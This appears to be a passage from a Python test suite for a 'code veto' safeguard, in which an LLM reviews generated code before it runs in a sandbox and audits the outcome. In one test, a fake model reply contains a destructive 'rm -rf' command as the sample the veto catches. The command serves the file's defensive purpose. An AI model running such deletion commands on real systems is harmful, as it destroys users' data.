                return ("```python\nprint(1)\n```", "main", 1, 1, 0.0)
            return ("Output ist 1.", "synth", 1, 1, 0.0)

        captured = self._setup_endpoint(monkeypatch, llm=fake_call)
        proj = self._create_project(name="P-Veto-Skip")
        resp = self._call(proj["id"])

        # Sandbox lief (PASS-aequivalent durch Skip)
        assert captured["executed"] is True
        # NUR 2 LLM-Calls: Haupt + Synthese, kein Veto-Probe
        assert state["n"] == 2
        # Audit: skipped-Eintrag (wir auditieren auch den Skip)
        async def read():
            from zerberus.core.database import _async_session_maker
            async with _async_session_maker() as session:
                rows = (await session.execute(select(CodeVeto))).scalars().all()
                return rows
        rows = asyncio.run(read())
        assert len(rows) == 1
        assert rows[0].verdict == "skipped"

    def test_disabled_flag_skips_completely(self, env, monkeypatch):
        """Mit code_veto_enabled=False darf KEIN Veto-Audit entstehen."""
        from zerberus.core.database import CodeVeto
        from sqlalchemy import select

        state = {"n": 0}

        async def fake_call(self, messages, session_id,
                            model_override=None, temperature_override=None):
            state["n"] += 1
            if state["n"] == 1:
                return ("```python\nimport subprocess\nsubprocess.run(['ls'])\n```", "m", 1, 1, 0.0)
            return ("Synthese.", "s", 1, 1, 0.0)

        captured = self._setup_endpoint(
            monkeypatch, llm=fake_call, code_veto_enabled=False,
        )
        proj = self._create_project(name="P-Veto-Disabled")
        self._call(proj["id"])
        # Audit: code_vetoes-Tabelle bleibt leer
        async def read():
            from zerberus.core.database import _async_session_maker
            async with _async_session_maker() as session:
                rows = (await session.execute(select(CodeVeto))).scalars().all()
                return rows
        rows = asyncio.run(read())
        assert len(rows) == 0
        # Sandbox lief
        assert captured["executed"] is True

    def test_veto_does_not_create_hitl_pending(self, env, monkeypatch):
        """Bei VETO entsteht KEIN HitL-Pending — der HitL-Audit-Pfad
        bleibt leer fuer diesen Run."""
        from zerberus.core.database import CodeExecution
        from sqlalchemy import select

        llm, _ = _make_two_step_llm(
            code_block_answer="```bash\nrm -rf /tmp/foo\n```",
            veto_text="VETO: zerstoererisch",
        )
        captured = self._setup_endpoint(monkeypatch, llm=llm)
        proj = self._create_project(name="P-Veto-NoHitL")
        self._call(proj["id"])

        # code_executions-Tabelle bleibt leer fuer diesen Run
        async def read():
            from zerberus.core.database import _async_session_maker
            async with _async_session_maker() as session:
                rows = (await session.execute(select(CodeExecution))).scalars().all()
                return rows
        rows = asyncio.run(read())
        assert len(rows) == 0


# ---------------------------------------------------------------------------
# 12) Smoke
# ---------------------------------------------------------------------------


class TestSmoke:
    def test_config_flags_present(self):
        from zerberus.core.config import get_settings
        s = get_settings()
        assert hasattr(s.projects, "code_veto_enabled")
        assert hasattr(s.projects, "code_veto_temperature")
        assert isinstance(s.projects.code_veto_enabled, bool)
        assert 0.0 <= float(s.projects.code_veto_temperature) <= 1.0

    def test_default_temperature_is_low(self):
        from zerberus.core.config import get_settings
        assert get_settings().projects.code_veto_temperature <= 0.2

    def test_code_vetoes_table_in_schema(self):
        from zerberus.core.database import Base, CodeVeto
        assert "code_vetoes" in Base.metadata.tables
        cols = {c.name for c in Base.metadata.tables["code_vetoes"].columns}
        # Pflicht-Felder
        assert {"audit_id", "session_id", "project_id", "verdict",
                "reason", "language", "code_text", "user_prompt",
                "latency_ms", "created_at"}.issubset(cols)

    def test_module_exports(self):
        import zerberus.core.code_veto as mod
        assert hasattr(mod, "should_run_veto")
        assert hasattr(mod, "build_veto_messages")
        assert hasattr(mod, "parse_veto_verdict")
        assert hasattr(mod, "run_veto")
        assert hasattr(mod, "store_veto_audit")
        assert hasattr(mod, "VetoVerdict")
        assert hasattr(mod, "DEFAULT_VETO_TEMPERATURE")
        assert hasattr(mod, "VETO_SYSTEM_PROMPT")
